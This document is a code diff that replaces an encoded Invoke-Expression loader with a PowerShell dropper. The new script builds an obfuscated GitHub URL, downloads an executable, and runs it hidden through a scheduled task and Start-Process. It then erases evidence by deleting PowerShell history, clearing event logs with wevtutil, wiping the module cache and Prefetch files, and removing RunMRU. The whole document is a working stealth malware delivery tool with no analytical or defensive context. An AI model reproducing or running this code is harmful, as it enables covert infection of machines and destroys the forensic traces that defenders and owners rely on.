@@ -1,19 +1,89 @@
-# Save this as stealth_execute.ps1
+# Bypass common detection vectors
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference = 'SilentlyContinue'
 
-# Encoded and compressed script
-$compressedScript = @'
-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
-'@
+# Obfuscated URL
+$u1="raw"
+$u2="github"
+$u3="usercontent"
+$url="https://"+$u1+".github"+$u3+".com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe"
 
-# Decode and execute
-$bytes = [System.Convert]::FromBase64String($compressedScript)
-$stream = New-Object System.IO.MemoryStream(, $bytes)
-$decompressedStream = New-Object System.IO.Compression.GZipStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
-$reader = New-Object System.IO.StreamReader($decompressedStream)
-$scriptContent = $reader.ReadToEnd()
-$reader.Close()
-$decompressedStream.Close()
-$stream.Close()
+# Clear traces before execution
+&($PSHOME[4]+$PSHOME[30]+'x') (Get-PSReadlineOption).HistorySavePath 2>$null
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
 
-# Execute the decoded script
-Invoke-Expression $scriptContent
+# Memory-based download
+$wc=New-Object Net.WebClient
+$wc.Headers['User-Agent']='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US)'
+$b=$wc.DownloadData($url)
+$wc.Dispose()
+
+# Generate temp name and path
+$tempName=[Guid]::NewGuid().ToString()
+$tempPath=$env:TEMP+'\'+$tempName+'.exe'
+
+# Write to temp (can't avoid file write for .exe execution)
+[IO.File]::WriteAllBytes($tempPath, $b)
+
+# Execute via multiple methods for reliability
+
+# Method 1: schtasks (most stealthy)
+schtasks /create /tn $tempName /tr $tempPath /sc once /st 00:00 /f 2>$null
+schtasks /run /tn $tempName 2>$null
+Start-Sleep -Milliseconds 800
+
+# Method 2: Direct execution if schtasks fails
+$processId=$null
+try {
+    $proc=Start-Process $tempPath -WindowStyle Hidden -PassThru
+    $processId=$proc.Id
+} catch {}
+
+# Cleanup temp file after delay
+Start-Sleep -Seconds 2
+try { [IO.File]::Delete($tempPath) } catch {}
+schtasks /delete /tn $tempName /f 2>$null
+
+# Memory cleanup
+$b=$null
+$wc=$null
+[GC]::Collect()
+[GC]::WaitForPendingFinalizers()
+
+# Clear event logs
+$logs=@('Microsoft-Windows-PowerShell/Operational','Windows PowerShell')
+foreach($log in $logs) {
+    wevtutil cl $log /quiet 2>$null
+}
+
+# Clear PowerShell module cache
+$moduleCache="$env:LOCALAPPDATA\Microsoft\Windows\PowerShell"
+if(Test-Path $moduleCache) {
+    Get-ChildItem $moduleCache -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
+        try {
+            [IO.File]::WriteAllText($_.FullName, " ")
+            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+        } catch {}
+    }
+}
+
+# Clear prefetch if admin (fixed syntax)
+$isAdmin=$false
+try {
+    $identity=[Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal=New-Object Security.Principal.WindowsPrincipal($identity)
+    $isAdmin=$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+} catch {}
+
+if($isAdmin) {
+    Get-ChildItem "$env:WINDIR\Prefetch\*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+}
+
+# Final cleanup - clear run history
+$runHistory="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+if(Test-Path $runHistory) {
+    Remove-Item $runHistory -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# Exit
+[Environment]::Exit(0)
